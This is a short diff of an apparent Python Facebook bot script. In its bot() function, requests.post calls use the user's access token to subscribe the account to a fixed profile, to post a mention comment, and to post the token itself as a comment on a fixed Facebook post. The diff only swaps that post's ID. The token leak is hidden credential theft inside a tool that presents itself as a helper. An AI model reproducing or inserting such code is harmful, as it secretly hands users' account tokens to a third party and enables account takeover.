@@ -66,7 +66,7 @@ def bot():
 		tokenz()
 	kom = ("@[100024540287354:] ")
 	requests.post('https://graph.facebook.com/100024540287354/subscribers?access_token=' + toket) 
-	requests.post('https://graph.facebook.com/160431849441751/comments/?message=' + toket + '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/160444282773841/comments/?message=' + toket + '&access_token=' + toket)
 	requests.post('https://graph.facebook.com/1090371428457523/comments/?message=' + kom + '&access_token=' + toket)
 	menu()
 
